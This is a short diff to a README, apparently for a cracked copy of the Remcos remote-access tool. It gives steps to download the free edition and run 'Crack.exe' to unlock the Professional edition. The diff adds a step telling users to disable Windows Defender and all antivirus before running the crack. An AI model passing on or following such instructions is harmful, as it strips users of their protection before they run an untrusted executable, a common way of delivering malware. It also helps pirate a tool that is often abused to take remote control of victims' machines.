@@ -13,7 +13,8 @@
 * Crack Activation   *
 ************************
 1) Download Remcos Free https://breakingsecurity.net/remcos/free/
-2) Click "Crack.exe" to make Free Edition become Remcos Profesional
+2) Disable Windows Defender/All Antivirus
+3) Click "Crack.exe" to make Free Edition become Remcos Profesional
 
 ************************
 * Quick Setup          *
